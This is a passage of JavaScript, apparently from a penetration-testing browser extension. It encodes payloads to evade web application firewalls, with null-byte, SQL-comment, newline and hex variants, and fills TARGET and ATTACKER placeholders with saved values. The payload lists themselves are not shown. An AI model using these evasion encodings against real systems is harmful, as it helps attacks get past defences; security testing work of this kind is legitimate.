  hex_encode:        'Hex Encode',
  unicode_escape:    'Unicode Escape',
  case_alternation:  'Case Alternation',
  null_byte:         'Null Byte Inject',
  sql_comment:       'SQL Comment Break',
  tab_substitute:    'Tab Substitute',
  newline_inject:    'Newline Inject',
  json_unicode:      'JSON Unicode',
  html_hex:          'HTML Hex Entities',
};

// ── STATE ────────────────────────────────────────────────────────────────────

function mutate(p, type) {
  switch(type) {
    case 'url_encode':
      return encodeURIComponent(p);
    case 'double_url_encode':
      return encodeURIComponent(encodeURIComponent(p));
    case 'html_entity':
      return p.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
               .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
    case 'base64':
      try { return btoa(unescape(encodeURIComponent(p))); } catch(e) { return btoa(p); }
    case 'hex_encode':
      return [...p].map(c => '%' + c.charCodeAt(0).toString(16).toUpperCase().padStart(2,'0')).join('');
    case 'unicode_escape':
      return [...p].map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4,'0')).join('');
    case 'case_alternation':
      return [...p].map((c,i) => i%2===0 ? c.toLowerCase() : c.toUpperCase()).join('');
    case 'null_byte':
      return p + '%00';
    case 'sql_comment':
      return p.replace(/ /g, '/**/');
    case 'tab_substitute':
      return p.replace(/ /g, '%09');
    case 'newline_inject':
      return p.replace(/ /g, '%0a');
    case 'json_unicode':
      return [...p].map(c => c.charCodeAt(0) > 127
        ? '\\u' + c.charCodeAt(0).toString(16).padStart(4,'0') : c).join('');
    case 'html_hex':
      return [...p].map(c => '&#x' + c.charCodeAt(0).toString(16).toUpperCase() + ';').join('');
    default: return p;
  }
}


// ── Placeholder substitution (shared by popup + injector) ──────────────────────
// Replaces TARGET / ATTACKER / OAST tokens with the user's saved values.
const PLACEHOLDER_KEYS = ['TARGET', 'ATTACKER', 'OAST'];

function applyPlaceholders(text, vals) {
  if (!text || !vals) return text;
  let out = text;
  if (vals.TARGET)   out = out.replace(/TARGET(?:\.com)?/g, vals.TARGET);
  if (vals.ATTACKER) out = out.replace(/ATTACKER/g, vals.ATTACKER);
  if (vals.OAST)     out = out.replace(/OAST/g, vals.OAST);
  return out;
}

// Make symbols available to service-worker / module contexts too.
if (typeof self !== 'undefined') {
  self.PAYLOADS = PAYLOADS;
  self.WAF_PROFILES = WAF_PROFILES;
  self.MUTATION_LABELS = MUTATION_LABELS;
  self.mutate = mutate;
  self.applyPlaceholders = applyPlaceholders;
  self.PLACEHOLDER_KEYS = PLACEHOLDER_KEYS;
}
